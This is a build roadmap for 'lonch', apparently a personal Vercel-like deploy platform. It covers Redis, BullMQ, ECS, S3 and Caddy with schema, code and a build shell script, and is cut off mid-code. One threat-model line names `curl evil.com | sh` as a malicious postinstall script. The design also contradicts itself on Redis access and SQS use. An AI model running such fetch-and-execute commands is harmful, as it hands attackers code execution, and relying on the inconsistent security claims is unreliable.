# lonch — build roadmap

---

## Architecture at a glance

```
Express API  →  BullMQ (Redis)  →  ECS build task  →  Redis pub/sub  →  ECS app task  →  Caddy
                                         ↓ logs (same Redis, different channel)
                                    Redis pub/sub  →  SSE  →  Browser
```

Static path: ECS build task → S3 (output only) → Caddy proxies to S3

---

## How the architecture works — say this in an interview

### One line
> "Developer hits deploy, we queue the job, an isolated AWS container clones and builds their repo, publishes its progress live via Redis, and when done signals via SQS — we then either serve their static files from S3 or spin up their backend as a long-running ECS container behind a wildcard subdomain."

---

### The pieces and what each one does

| Piece | What it is | Why it's here |
|---|---|---|
| **Express API** | Your Bun + Express backend | Single entry point — authenticates requests, writes to DB, enqueues jobs, serves SSE logs |
| **Postgres** | Relational database | Source of truth — stores users, projects, deployments, log lines, env vars |
| **Redis + BullMQ** | In-memory store + job queue built on top | Carries all async communication: BullMQ for API→Worker job dispatch, pub/sub for live log lines to SSE clients, and pub/sub for BUILD_COMPLETE signals from ECS back to the API. One service, three uses. |
| **ECS Fargate (build task)** | Ephemeral Docker container on AWS | Runs user's `npm install` + `npm run build` in complete isolation. Has no access to your DB or secrets. Clones the repo itself using a short-lived GitHub token. Dies after build succeeds or fails. |
| **ECR** | AWS private Docker image registry | Stores the Docker image of the user's backend app after it's built. ECS app task pulls from here. |
| **S3** | AWS file storage | Stores static build output only (e.g. `dist/`). Nothing else. |
| **ECS Fargate (app task)** | Long-running Docker container | Runs the user's backend app 24/7. ECS pulls the image from ECR. One task per project. |
| **Caddy** | Reverse proxy | Routes `slug.lonch.app` to the right ECS task (backend) or S3 path (static). Handles wildcard TLS certificates automatically via Let's Encrypt DNS challenge. |

---

### Step by step — what happens when a developer clicks Deploy

```
Step 1 — Developer sends:  POST /api/v1/projects/:id/deploy
          │
          ▼
Step 2 — API immediately:
          • creates a Deployment row in Postgres  →  status = QUEUED
          • pushes a job { deploymentId, projectId } into BullMQ (Redis)
          • returns HTTP 202 { deploymentId }
            ↑ responds in <50ms — the actual work hasn't started yet
          │
          ▼
Step 3 — BullMQ worker (in the same API process) picks up the job:
          • marks Deployment → status = BUILDING
          • publishes log line "▶ Build started" to Redis channel deploy:logs:{id}
          • fetches the project from Postgres (repoUrl, buildCommand, type, etc.)
          • mints a short-lived GitHub installation token (1 hour, via GitHub App)
            → this is how we access private repos without storing a long-lived secret
          • launches an ECS Fargate build task, passing as env vars:
              GITHUB_TOKEN, REPO_URL, DEPLOYMENT_ID, BUILD_COMMAND,
              INSTALL_COMMAND, OUTPUT_DIRECTORY, PROJECT_TYPE,
              REDIS_URL (for publishing logs AND signaling done — same connection)
          • worker's job ends here — it does NOT wait or poll
          │
          ▼
Step 4 — ECS build task starts (isolated, untrusted zone):
          • has NO route to your Postgres
          • has NO access to your GitHub App private key or API secrets
          • everything it needs came in via env vars
          │
          • clones the repo:
              git clone https://x-access-token:$GITHUB_TOKEN@github.com/...
          • runs install command (e.g. npm install)
          • runs build command (e.g. npm run build)
          • throughout all of this, each stdout/stderr line is published to
              Redis channel  deploy:logs:{deploymentId}
            → the developer is watching these lines appear live in their browser
          │
          ├── if STATIC project:
          │     • uploads dist/ to S3:  s3://lonch-deployments/static/{deploymentId}/
          │     • publishes to Redis:  PUBLISH deploy:events:{id} { event: "BUILD_COMPLETE", type: "STATIC", staticS3Key: "..." }
          │     • container exits and is discarded
          │
          └── if BACKEND project:
                • generates a Dockerfile if the repo doesn't have one
                  (detects framework from package.json: Next.js, Express, Bun, etc.)
                • docker build -t {ECR_REGISTRY}/{slug}:{deploymentId} .
                • docker push → image is now in ECR
                • publishes to Redis:  PUBLISH deploy:events:{id} { event: "BUILD_COMPLETE", type: "BACKEND", imageUri: "..." }
                • container exits and is discarded
          │
          ▼
Step 5 — Redis event subscriber (in the API process, psubscribe on deploy:events:*) receives BUILD_COMPLETE:
          │
          ├── if type = STATIC:
          │     • updates Caddy to route slug.lonch.app → S3 path
          │     • marks Deployment → status = SUCCESS, url = https://slug.lonch.app
          │     • publishes "✓ Deployed" to Redis log channel → SSE sends it → done event fires
          │
          └── if type = BACKEND:
                • registers a new ECS task definition with the ECR image + project env vars
                • launches it as an ECS service (auto-restarts on crash)
                • waits for health check to pass (polls task status, ~10s)
                • updates Caddy to route slug.lonch.app → ECS task IP:port
                • marks Deployment → status = SUCCESS, url = https://slug.lonch.app
                • publishes "✓ Deployed" to Redis log channel → SSE sends it → done event fires
          │
          ▼
Step 6 — Caddy (wildcard reverse proxy):
          • receives:  GET https://my-app.lonch.app/anything
          • strips subdomain → "my-app"
          • hits internal API endpoint to look up upstream for that slug
          • STATIC: proxy to s3://lonch-deployments/static/{deploymentId}/
          • BACKEND: proxy to ECS task IP:3000
          • TLS is automatic — Caddy holds a single wildcard cert for *.lonch.app
          │
          ▼
          Visitor sees the deployed site.
```

---

### How live logs work — no polling, no repeated DB queries

```
SSE connection opens (GET /deployments/:id/logs):
  → reads ALL existing DeploymentLog rows from DB  (once, on connect)
  → sends them all immediately to the client
  → then subscribes to Redis channel: deploy:logs:{deploymentId}
  → connection just sits there — no loops, no timers, no DB reads

Meanwhile, two things publish to that Redis channel:
  1. BullMQ worker (same process as API):
       publishLog() → write 1 DB row + redis.publish()  (fires instantly)
  2. ECS build task (different machine, has REDIS_URL as env var):
       each stdout/stderr line → redis.publish()  (near-instant)

Redis pub/sub is not polling — it's push.
When a publisher calls redis.publish(), every subscriber receives it in <5ms.
The SSE handler writes that to the response → browser receives it → line appears.

The DB write happens ONCE per line, triggered by the publisher.
The SSE connection itself never touches the DB again after the initial load.

Wire format (what the browser's EventSource receives):
  data: {"line":"▶ Build started","stream":"stdout"}\n\n
  data: {"line":"Cloning into /workspace...","stream":"stderr"}\n\n
  data: {"line":"added 342 packages in 8s","stream":"stdout"}\n\n
  data: {"line":"✓ built in 2.84s","stream":"stdout"}\n\n

  event: done
  data: {"status":"SUCCESS","url":"https://my-app.lonch.app"}\n\n
  ← this fires the EventSource "done" listener, which closes the connection
```

---

### The trust boundary — why ECS is isolated

```
TRUSTED ZONE (your code)              UNTRUSTED ZONE (user's code runs here)
──────────────────────────────── ╳ ───────────────────────────────────────
Express API          ──launches──►   ECS build task (Fargate)
Postgres             NO ROUTE         npm install, npm run build
Redis                NO ROUTE         (could be malicious scripts)
GitHub App key       NOT INJECTED     
Your AWS creds       NOT INJECTED    ← task has its own IAM role:
                                         s3:PutObject (your bucket, static/ prefix only)
                                         ecr:GetAuthorizationToken + BatchCheckLayerAvailability
                                         sqs:SendMessage (your queue only)
                                         NO other permissions
```

Even if someone's `package.json` runs `curl evil.com | sh` in a postinstall script,
it cannot reach your DB, cannot read your secrets, and cannot access any AWS resource
outside the narrow IAM role you defined.

---

## Current status

- [x] Auth (email+password, GitHub OAuth, JWT access/refresh, token rotation)
- [x] GitHub App integration (`getInstallationToken`, list repos)
- [ ] Phase 0 — schema + deps
- [ ] Phase 1 — intake API + SSE logs
- [ ] Phase 2 — BullMQ worker (launch ECS, that's it)
- [ ] Phase 3 — ECS build container (the actual build logic)
- [ ] Phase 4 — Redis event consumer + ECS app hosting
- [ ] Phase 5 — Caddy reverse proxy + wildcard TLS
- [ ] Phase 6 — AWS setup (one-time, do before Phase 3)
- [ ] Phase 7 — polish

---

## Phase 0 — schema + deps

> Do this entire phase before writing any service code. Everything else depends on the schema.

### 0a. Prisma schema changes

- [ ] Open `prisma/schema.prisma`
- [ ] Add enums (put these above the `Project` model):
  ```prisma
  enum ProjectType {
    STATIC
    BACKEND
  }

  enum DeploymentStatus {
    QUEUED
    BUILDING
    SUCCESS
    FAILED
    CANCELLED
  }
  ```
- [ ] Add fields to the existing `Project` model:
  ```prisma
  repoUrl         String
  repoId          Int?
  type            ProjectType   @default(STATIC)
  framework       String?       // "nextjs" | "vite" | "express" | "bun"
  buildCommand    String?       // e.g. "npm run build"
  installCommand  String?       // e.g. "npm install"
  startCommand    String?       // backend only — e.g. "node dist/index.js"
  outputDirectory String?       // static only — e.g. "dist"
  rootDirectory   String?       // monorepo support — e.g. "apps/web"
  deployments     Deployment[]
  envVars         EnvVar[]
  ```
- [ ] Add `Deployment` model:
  ```prisma
  model Deployment {
    id             String           @id @default(uuid())
    projectId      String
    project        Project          @relation(fields: [projectId], references: [id], onDelete: Cascade)
    status         DeploymentStatus @default(QUEUED)
    imageUri       String?          // ECR image URI — BACKEND deploys only
    staticS3Key    String?          // S3 prefix — STATIC deploys only
    url            String?          // live URL after SUCCESS
    ecsServiceArn  String?          // so we can stop it on re-deploy
    logs           DeploymentLog[]
    createdAt      DateTime         @default(now())
    updatedAt      DateTime         @updatedAt
  }
  ```
- [ ] Add `DeploymentLog` model:
  ```prisma
  model DeploymentLog {
    id           String     @id @default(uuid())
    deploymentId String
    deployment   Deployment @relation(fields: [deploymentId], references: [id], onDelete: Cascade)
    line         String
    stream       String     @default("stdout")  // "stdout" | "stderr"
    createdAt    DateTime   @default(now())
  }
  ```
- [ ] Add `EnvVar` model:
  ```prisma
  model EnvVar {
    id        String   @id @default(uuid())
    projectId String
    project   Project  @relation(fields: [projectId], references: [id], onDelete: Cascade)
    key       String
    value     String   // encrypt in Phase 7, plain text for now
    createdAt DateTime @default(now())
    updatedAt DateTime @updatedAt

    @@unique([projectId, key])
  }
  ```

### 0b. Run migration

- [ ] `npx prisma migrate dev --name add_deployments`
- [ ] Open the generated SQL in `prisma/migrations/` — confirm enums + all 3 new tables are there
- [ ] `npx prisma generate` — regenerates the TS client

### 0c. Install packages

- [ ] `bun add bullmq ioredis`
  - `bullmq` is the job queue. `ioredis` is the Redis client it uses underneath.
- [ ] `bun add @aws-sdk/client-ecs @aws-sdk/client-ecr @aws-sdk/client-s3`
  - One SDK package per AWS service used. No SQS — ECS signals completion via Redis instead.

### 0d. Env vars

- [ ] Add to `.env`:
  ```
  REDIS_URL=redis://localhost:6379

  AWS_REGION=ap-south-1
  AWS_ACCESS_KEY_ID=
  AWS_SECRET_ACCESS_KEY=

  S3_BUCKET=lonch-deployments

  ECR_REGISTRY=<account-id>.dkr.ecr.ap-south-1.amazonaws.com

  ECS_CLUSTER=lonch-cluster
  ECS_BUILD_TASK_DEFINITION=lonch-build-runner
  ECS_SUBNET_ID=subnet-xxxxxxxx
  ECS_SECURITY_GROUP_ID=sg-xxxxxxxx

  ```
- [ ] Start local Redis: `docker run -d -p 6379:6379 redis:alpine`

---

## Phase 1 — intake API + SSE logs

> Goal: `POST /deploy` returns 202, job sits in Redis queue, `GET /logs` hangs open as SSE stream.
> No actual building happens yet — that comes in Phase 2.

### 1a. Redis connection

- [ ] Create `src/shared/libs/redis/index.ts`
  ```ts
  import { Redis } from "ioredis"

  export const redis = new Redis(process.env.REDIS_URL!, {
    maxRetriesPerRequest: null,  // required by BullMQ — do not remove
  })
  ```
  - This single connection is used for BullMQ + publishing log lines
  - Subscriber connections are created separately where needed (a subscriber can't be shared)

### 1b. BullMQ queue

- [ ] Create `src/shared/libs/queue/index.ts`
  ```ts
  import { Queue } from "bullmq"
  import { redis } from "../redis"

  export type DeployJobData = {
    deploymentId: string
    projectId: string
    userId: string
  }

  export const deployQueue = new Queue<DeployJobData>("deployments", {
    connection: redis,
  })
  ```

### 1c. Projects feature

- [ ] Create folder `src/features/projects/`
- [ ] Create `src/features/projects/services/createProject.ts`
  - Zod body schema:
    ```ts
    { name, repoUrl, repoId?, type, framework?,
      buildCommand?, installCommand?, startCommand?,
      outputDirectory?, rootDirectory? }
    ```
  - Generate `slug`: lowercase name, replace spaces with `-`, append 6 random chars
    e.g. `"My App"` → `"my-app-x7k2pq"`
  - `prisma.project.create({ data: { ...body, slug, ownerId: req.user.id } })`
  - Return the created project
- [ ] Create `src/features/projects/services/listProjects.ts`
  - `prisma.project.findMany({ where: { ownerId: req.user.id } })`
- [ ] Create `src/features/projects/routes/index.ts`
  - `POST /` → createProject
  - `GET /` → listProjects
  - `GET /:id` → getProject (verify ownerId === req.user.id, throw 403 if not)
- [ ] Register in `src/index.ts`: `app.use("/api/v1/projects", projectsRoute)`

### 1d. Deploy trigger

- [ ] Implement `src/features/deploy/services/deploy.ts`:
  ```
  1. req.body: { projectId }
  2. fetch project → verify project.ownerId === req.user.id → 403 if not
  3. const deployment = await prisma.deployment.create({
       data: { projectId, status: "QUEUED" }
     })
  4. await deployQueue.add("deploy", {
       deploymentId: deployment.id,
       projectId,
       userId: req.user.id
     })
  5. res.status(202).json({ deploymentId: deployment.id })
  ```

### 1e. Deployment status endpoint

- [ ] Create `src/features/deploy/services/getDeployment.ts`
  - `prisma.deployment.findUnique({ where: { id }, include: { project: { select: { slug: true, type: true } } } })`
  - Verify project.ownerId === req.user.id
  - Return `{ id, status, url, createdAt, project }`

### 1f. SSE log stream

- [ ] Create `src/features/deploy/services/streamLogs.ts`
- [ ] Implement step by step:

  **Step 1 — set SSE headers**
  ```ts
  res.setHeader("Content-Type", "text/event-stream")
  res.setHeader("Cache-Control", "no-cache")
  res.setHeader("Connection", "keep-alive")
  res.setHeader("X-Accel-Buffering", "no")  // stops Nginx from buffering SSE
  res.flushHeaders()
  ```

  **Step 2 — send existing logs (replay for late joiners)**
  ```ts
  const existing = await prisma.deploymentLog.findMany({
    where: { deploymentId: id },
    orderBy: { createdAt: "asc" },
  })
  for (const log of existing) {
    res.write(`data: ${JSON.stringify({ line: log.line, stream: log.stream })}\n\n`)
  }
  ```

  **Step 3 — if already finished, close immediately**
  ```ts
  const deployment = await prisma.deployment.findUnique({ where: { id } })
  if (["SUCCESS", "FAILED", "CANCELLED"].includes(deployment!.status)) {
    res.write(`event: done\ndata: ${JSON.stringify({ status: deployment!.status, url: deployment!.url })}\n\n`)
    res.end()
    return
  }
  ```

  **Step 4 — subscribe to Redis for live lines**
  ```ts
  // Must be a NEW connection — a subscriber cannot publish or run other commands
  const sub = new Redis(process.env.REDIS_URL!)
  await sub.subscribe(`deploy:logs:${id}`)

  sub.on("message", (_channel, message) => {
    res.write(`data: ${message}\n\n`)
  })
  ```

  **Step 5 — listen for done signal**
  ```ts
  // publishLog sends a special "done" message when deployment finishes
  sub.on("message", (_channel, message) => {
    const parsed = JSON.parse(message)
    if (parsed.event === "done") {
      res.write(`event: done\ndata: ${JSON.stringify({ status: parsed.status, url: parsed.url })}\n\n`)
      sub.disconnect()
      res.end()
    }
  })
  ```

  **Step 6 — clean up when browser closes the tab**
  ```ts
  req.on("close", () => {
    sub.unsubscribe()
    sub.disconnect()
  })
  ```

### 1g. Update deploy routes

- [ ] Update `src/features/deploy/routes/index.ts`:
  ```ts
  router.post("/", authMiddleware, deploy)
  router.get("/:id", authMiddleware, getDeployment)
  router.get("/:id/logs", authMiddleware, streamLogs)
  ```

### 1h. Smoke test (before writing any worker code)

- [ ] `bun run dev`
- [ ] `POST /api/v1/projects` with `{ name, repoUrl, type: "STATIC" }` → should return project with slug
- [ ] `POST /api/v1/deploy` with `{ projectId }` → should return `202 { deploymentId }`
- [ ] `redis-cli LLEN bull:deployments:wait` → should be 1 (job is sitting in queue)
- [ ] Open `GET /api/v1/deploy/{id}/logs` in browser → tab should hang open (SSE stream waiting)
- [ ] Check Postgres: `deployment` row should exist with `status = QUEUED`

---

## Phase 2 — BullMQ worker

> The worker's only job: mark BUILDING, mint GitHub token, launch ECS task. That's it.
> It does NOT clone the repo. The ECS container does that itself.

### 2a. publishLog helper

- [ ] Create `src/features/deploy/worker/publishLog.ts`
  ```ts
  import { prisma } from "../../../shared/libs/prisma"
  import { redis } from "../../../shared/libs/redis"

  export async function publishLog(deploymentId: string, line: string, stream = "stdout") {
    // 1. permanent record
    await prisma.deploymentLog.create({ data: { deploymentId, line, stream } })
    // 2. live delivery to SSE subscribers (anyone watching the deploy right now)
    await redis.publish(`deploy:logs:${deploymentId}`, JSON.stringify({ line, stream }))
  }

  export async function publishDone(deploymentId: string, status: string, url?: string) {
    await redis.publish(`deploy:logs:${deploymentId}`,
      JSON.stringify({ event: "done", status, url }))
  }
  ```

### 2b. launchBuildTask helper

- [ ] Create `src/features/deploy/worker/launchBuildTask.ts`
  ```ts
  import { ECSClient, RunTaskCommand } from "@aws-sdk/client-ecs"

  export async function launchBuildTask(deploymentId, project, githubToken) {
    const ecs = new ECSClient({ region: process.env.AWS_REGION })

    const ecrImageUri = `${process.env.ECR_REGISTRY}/${project.slug}:${deploymentId}`

    const result = await ecs.send(new RunTaskCommand({
      cluster: process.env.ECS_CLUSTER,
      taskDefinition: process.env.ECS_BUILD_TASK_DEFINITION,
      launchType: "FARGATE",
      networkConfiguration: {
        awsvpcConfiguration: {
          subnets: [process.env.ECS_SUBNET_ID!],
          securityGroups: [process.env.ECS_SECURITY_GROUP_ID!],
          assignPublicIp: "ENABLED",  // needs outbound internet to clone from GitHub + push to ECR
        },
      },
      overrides: {
        containerOverrides: [{
          name: "build-runner",
          environment: [
            { name: "DEPLOYMENT_ID",    value: deploymentId },
            { name: "REPO_URL",         value: project.repoUrl },
            { name: "GITHUB_TOKEN",     value: githubToken },      // short-lived, 1hr
            { name: "PROJECT_TYPE",     value: project.type },
            { name: "FRAMEWORK",        value: project.framework ?? "node" },
            { name: "INSTALL_COMMAND",  value: project.installCommand ?? "npm install" },
            { name: "BUILD_COMMAND",    value: project.buildCommand ?? "npm run build" },
            { name: "OUTPUT_DIRECTORY", value: project.outputDirectory ?? "dist" },
            { name: "ROOT_DIRECTORY",   value: project.rootDirectory ?? "" },
            { name: "ECR_REGISTRY",     value: process.env.ECR_REGISTRY! },
            { name: "ECR_IMAGE_URI",    value: ecrImageUri },
            { name: "S3_BUCKET",        value: process.env.S3_BUCKET! },
            { name: "AWS_REGION",       value: process.env.AWS_REGION! },
            { name: "REDIS_URL",        value: process.env.REDIS_URL! },  // logs AND build complete signal
          ],
        }],
      },
    }))

    const taskArn = result.tasks?.[0]?.taskArn
    if (!taskArn) throw new Error("ECS RunTask returned no task ARN")
    return { taskArn, ecrImageUri }
  }
  ```

### 2c. Job processor

- [ ] Create `src/features/deploy/worker/processor.ts`
  ```ts
  export async function processDeployJob(job: Job<DeployJobData>) {
    const { deploymentId, projectId } = job.data

    // 1. mark building
    await prisma.deployment.update({ where: { id: deploymentId }, data: { status: "BUILDING" } })
    await publishLog(deploymentId, "▶ Build started")

    // 2. fetch project + owner
    const project = await prisma.project.findUnique({
      where: { id: projectId },
      include: { owner: { select: { githubInstallationId: true } }, envVars: true },
    })
    if (!project?.owner.githubInstallationId) throw new Error("GitHub App not installed for this user")

    // 3. mint short-lived GitHub token
    const token = await getInstallationToken(project.owner.githubInstallationId)
    await publishLog(deploymentId, "✓ GitHub access token minted")

    // 4. launch ECS build task — passes token + everything else as env vars
    const { taskArn, ecrImageUri } = await launchBuildTask(deploymentId, project, token)
    await publishLog(deploymentId, `✓ Build task launched (${taskArn.split("/").pop()})`)
    await publishLog(deploymentId, "  Waiting for build to complete...")

    // 5. worker is done — SQS consumer handles what happens next (Phase 4)
    // store ecrImageUri so the SQS consumer can use it
    await prisma.deployment.update({
      where: { id: deploymentId },
      data: { imageUri: ecrImageUri }
    })
  }
  ```

### 2d. Worker setup

- [ ] Create `src/features/deploy/worker/index.ts`
  ```ts
  import { Worker } from "bullmq"
  import { redis } from "../../../shared/libs/redis"
  import { processDeployJob } from "./processor"

  export const deployWorker = new Worker("deployments", processDeployJob, {
    connection: redis,
    concurrency: 5,
  })

  deployWorker.on("failed", async (job, err) => {
    if (job?.data.deploymentId) {
      await prisma.deployment.update({
        where: { id: job.data.deploymentId },
        data: { status: "FAILED" },
      })
      await publishDone(job.data.deploymentId, "FAILED")
    }
    console.error(`Deploy job ${job?.id} failed:`, err.message)
  })
  ```
- [ ] Import in `src/index.ts`: `import "./features/deploy/worker"`

---

## Phase 3 — ECS build container

> A separate mini-project at repo root. You build this image once, push it to ECR.
> Your worker launches it once per deploy. It clones, builds, and signals when done.

### 3a. File structure

```
build-runner/
  Dockerfile              ← image you push to ECR once
  run.sh                  ← entrypoint — the full build pipeline
  templates/
    Dockerfile.nextjs     ← auto-generated Dockerfile for Next.js apps
    Dockerfile.node       ← fallback for Express/Node apps
    Dockerfile.bun        ← for Bun apps
```

### 3b. build-runner/Dockerfile

- [ ] Create `build-runner/Dockerfile`:
  ```dockerfile
  FROM node:20-alpine

  RUN apk add --no-cache git docker-cli aws-cli bash curl python3

  WORKDIR /runner
  COPY run.sh .
  COPY templates/ ./templates/
  RUN chmod +x run.sh

  ENTRYPOINT ["/runner/run.sh"]
  ```
  > Note on Docker-in-Docker: to run `docker build` inside a Fargate container,
  > mount the Docker socket at task definition level. Alternative: use Kaniko
  > (builds images without Docker daemon — better security, no socket needed).
  > Use Docker socket for now, Kaniko is a Phase 7 upgrade.

### 3c. build-runner/run.sh

- [ ] Write `build-runner/run.sh` — full pipeline:

  ```bash
  #!/bin/bash
  set -e  # stop immediately on any error — non-zero exit → SQS gets exitCode=1

  publish_log() {
    redis-cli -u "$REDIS_URL" PUBLISH "deploy:logs:$DEPLOYMENT_ID" \
      "{\"line\":\"$1\",\"stream\":\"${2:-stdout}\"}" > /dev/null
  }

  publish_event() {
    # signals the API that the build is done — same Redis, different channel
    redis-cli -u "$REDIS_URL" PUBLISH "deploy:events:$DEPLOYMENT_ID" "$1" > /dev/null
  }
  ```

  **Clone**
  ```bash
  publish_log "▶ Cloning repository..."
  git clone --depth=1 \
    "https://x-access-token:${GITHUB_TOKEN}@${REPO_URL#https://}" \
    /workspace 2>&1 | while read line; do publish_log "$line" "stderr"; done
  publish_log "✓ Repository cloned"
  ```
  > `REPO_URL` is `https://github.com/user/repo` — we strip `https://` and inject the token

  **Move to root directory (monorepo support)**
  ```bash
  cd "/workspace/${ROOT_DIRECTORY:-}"
  ```

  **Install**
  ```bash
  publish_log "▶ Running: ${INSTALL_COMMAND:-npm install}"
  eval "${INSTALL_COMMAND:-npm install}" 2>&1 | while read line; do publish_log "$line"; done
  publish_log "✓ Dependencies installed"
  ```

  **Build**
  ```bash
  publish_log "▶ Running: ${BUILD_COMMAND:-npm run build}"
  eval "${BUILD_COMMAND:-npm run build}" 2>&1 | while read line; do publish_log "$line"; done
  publish_log "✓ Build complete"
  ```

  **STATIC branch**
  ```bash
  if [ "$PROJECT_TYPE" = "STATIC" ]; then
    publish_log "▶ Uploading static files to S3..."
    STATIC_KEY="static/${DEPLOYMENT_ID}"
    aws s3 sync "${OUTPUT_DIRECTORY:-dist}" "s3://${S3_BUCKET}/${STATIC_KEY}/" --delete
    publish_log "✓ Static files uploaded"

    publish_event "{\"event\":\"BUILD_COMPLETE\",\"exitCode\":0,\"type\":\"STATIC\",\"staticS3Key\":\"$STATIC_KEY\"}"
  fi
  ```

  **BACKEND branch**
  ```bash
  if [ "$PROJECT_TYPE" = "BACKEND" ]; then
    # auto-generate Dockerfile if repo doesn't have one
    if [ ! -f Dockerfile ]; then
      publish_log "▶ No Dockerfile found — generating for framework: ${FRAMEWORK:-node}"
      cp "/runner/templates/Dockerfile.${FRAMEWORK:-node}" Dockerfile
      # inject start command
      sed -i "s|CMD_PLACEHOLDER|${START_COMMAND:-node dist/index.js}|g" Dockerfile
    fi

    publish_log "▶ Building Docker image..."
    aws ecr get-login-password --region "$AWS_REGION" \
      | docker login --username AWS --password-stdin "$ECR_REGISTRY"
    docker build -t "$ECR_IMAGE_URI" . 2>&1 | while read line; do publish_log "$line"; done

    publish_log "▶ Pushing image to ECR..."
    docker push "$ECR_IMAGE_URI" 2>&1 | while read line; do publish_log "$line"; done
    publish_log "✓ Image pushed: $ECR_IMAGE_URI"

    publish_event "{\"event\":\"BUILD_COMPLETE\",\"exitCode\":0,\"type\":\"BACKEND\",\"imageUri\":\"$ECR_IMAGE_URI\"}"
  fi
  ```

  **Error trap — if set -e kills the script, signal failure**
  ```bash
  trap 'publish_event "{\"event\":\"BUILD_COMPLETE\",\"exitCode\":1}"' ERR
  ```

### 3d. Dockerfile templates

- [ ] `build-runner/templates/Dockerfile.node`:
  ```dockerfile
  FROM node:20-alpine
  WORKDIR /app
  COPY . .
  EXPOSE 3000
  CMD ["CMD_PLACEHOLDER"]
  ```
  > `CMD_PLACEHOLDER` is replaced by `sed` in run.sh with the project's startCommand

- [ ] `build-runner/templates/Dockerfile.nextjs`:
  ```dockerfile
  FROM node:20-alpine
  WORKDIR /app
  COPY .next/standalone ./
  COPY .next/static ./.next/static
  COPY public ./public
  EXPOSE 3000
  ENV NODE_ENV=production
  CMD ["node", "server.js"]
  ```
  > Requires `output: "standalone"` in next.config.js. Warn in run.sh if not detected.

- [ ] `build-runner/templates/Dockerfile.bun`:
  ```dockerfile
  FROM oven/bun:alpine
  WORKDIR /app
  COPY . .
  EXPOSE 3000
  CMD ["CMD_PLACEHOLDER"]
  ```

### 3e. Push the build-runner image

- [ ] In AWS console: create ECR repository `lonch-build-runner` (public or private, private is fine)
- [ ] From your machine:
  ```bash
  aws ecr get-login-password --region ap-south-1 \
    | docker login --username AWS --password-stdin <ECR_REGISTRY>

  docker build -t <ECR_REGISTRY>/lonch-build-runner:latest ./build-runner
  docker push <ECR_REGISTRY>/lonch-build-runner:latest
  ```
- [ ] In AWS console: create ECS Task Definition named `lonch-build-runner`
  - Launch type: Fargate
  - Task role: IAM role with `s3:PutObject`, `ecr:*`, `sqs:SendMessage` (scoped to your resources)
  - CPU: 1 vCPU, Memory: 2 GB
  - Container name: `build-runner`, image: `<ECR_REGISTRY>/lonch-build-runner:latest`
  - No port mappings (this task doesn't receive traffic)
  - Log driver: awslogs, log group: `/ecs/lonch-build-runner` (create this group in CloudWatch first)

---

## Phase 4 — Redis event consumer + ECS app hosting

> A Redis psubscribe listener running in the same API process.
> ECS build tasks publish to `deploy:events:{id}` when done — the consumer handles what comes next.

### 4a. Redis event subscriber

- [ ] Create `src/features/deploy/consumer/index.ts`
  ```ts
  import { Redis } from "ioredis"
  import { handleBuildComplete } from "./handleBuildComplete"

  export function startBuildEventConsumer() {
    // Must be a dedicated connection — a subscriber can't run other commands
    const sub = new Redis(process.env.REDIS_URL!)

    // psubscribe matches deploy:events:* — catches all deployment IDs
    sub.psubscribe("deploy:events:*", (err) => {
      if (err) console.error("Redis psubscribe failed:", err)
      else console.log("Build event consumer listening on deploy:events:*")
    })

    sub.on("pmessage", async (_pattern, channel, message) => {
      const deploymentId = channel.replace("deploy:events:", "")
      try {
        const body = JSON.parse(message)
        if (body.event === "BUILD_COMPLETE") {
          await handleBuildComplete({ ...body, deploymentId })
        }
      } catch (err) {
        console.error(`Failed to handle build event for ${deploymentId}:`, err)
        // no retry mechanism here — if the API was down when ECS published, the message is lost
        // trade-off accepted: simpler than SQS, acceptable for a resume project
      }
    })

    sub.on("error", (err) => console.error("Build event consumer Redis error:", err))
  }
  ```
- [ ] Import and start in `src/index.ts`: `startBuildEventConsumer()`

### 4b. handleBuildComplete

- [ ] Create `src/features/deploy/consumer/handleBuildComplete.ts`

  **On failure (exitCode !== 0)**
  ```ts
  if (body.exitCode !== 0) {
    await prisma.deployment.update({ where: { id: body.deploymentId }, data: { status: "FAILED" } })
    await publishLog(body.deploymentId, "✗ Build failed", "stderr")
    await publishDone(body.deploymentId, "FAILED")
    return
  }
  ```

  **On STATIC success**
  ```ts
  if (body.type === "STATIC") {
    await prisma.deployment.update({
      where: { id: body.deploymentId },
      data: { status: "SUCCESS", staticS3Key: body.staticS3Key }
    })
    const project = await prisma.project.findFirst({ /* via deployment */ })
    const url = `https://${project.slug}.lonch.app`
    await updateCaddyUpstream(project.slug, { type: "STATIC", s3Key: body.staticS3Key })
    await prisma.deployment.update({ where: { id: body.deploymentId }, data: { url } })
    await publishLog(body.deploymentId, `✓ Deployed → ${url}`)
    await publishDone(body.deploymentId, "SUCCESS", url)
  }
  ```

  **On BACKEND success**
  ```ts
  if (body.type === "BACKEND") {
    await publishLog(body.deploymentId, "▶ Launching app container...")
    const { serviceArn, taskIp } = await launchAppTask(body.imageUri, project)
    const url = `https://${project.slug}.lonch.app`
    await updateCaddyUpstream(project.slug, { type: "BACKEND", ip: taskIp, port: 3000 })
    await prisma.deployment.update({
      where: { id: body.deploymentId },
      data: { status: "SUCCESS", url, ecsServiceArn: serviceArn }
    })
    await publishLog(body.deploymentId, `✓ Deployed → ${url}`)
    await publishDone(body.deploymentId, "SUCCESS", url)
  }
  ```

### 4c. launchAppTask

- [ ] Create `src/features/deploy/consumer/launchAppTask.ts`
  ```ts
  // registers a task definition with the user's image + env vars, runs it as an ECS service
  export async function launchAppTask(imageUri, project) {
    const ecs = new ECSClient({ region: process.env.AWS_REGION })

    // 1. register task definition
    const taskDef = await ecs.send(new RegisterTaskDefinitionCommand({
      family: `lonch-app-${project.slug}`,
      networkMode: "awsvpc",
      requiresCompatibilities: ["FARGATE"],
      cpu: "256",      // 0.25 vCPU — cheapest Fargate tier
      memory: "512",
      containerDefinitions: [{
        name: "app",
        image: imageUri,
        portMappings: [{ containerPort: 3000 }],
        environment: project.envVars.map(e => ({ name: e.key, value: e.value })),
        logConfiguration: {
          logDriver: "awslogs",
          options: {
            "awslogs-group": `/ecs/lonch-apps/${project.slug}`,
            "awslogs-region": process.env.AWS_REGION!,
            "awslogs-stream-prefix": "app",
          }
        }
      }]
    }))

    // 2. stop the old ECS service for this project if it exists
    const oldDeployment = await prisma.deployment.findFirst({
      where: { projectId: project.id, status: "SUCCESS", ecsServiceArn: { not: null } },
      orderBy: { createdAt: "desc" },
    })
    if (oldDeployment?.ecsServiceArn) {
      await stopOldService(oldDeployment.ecsServiceArn)
    }

    // 3. create new ECS service
    const service = await ecs.send(new CreateServiceCommand({
      cluster: process.env.ECS_CLUSTER,
      serviceName: `lonch-${project.slug}`,
      taskDefinition: taskDef.taskDefinition!.taskDefinitionArn!,
      desiredCount: 1,
      launchType: "FARGATE",
      networkConfiguration: { /* same subnet + security group as build task */ }
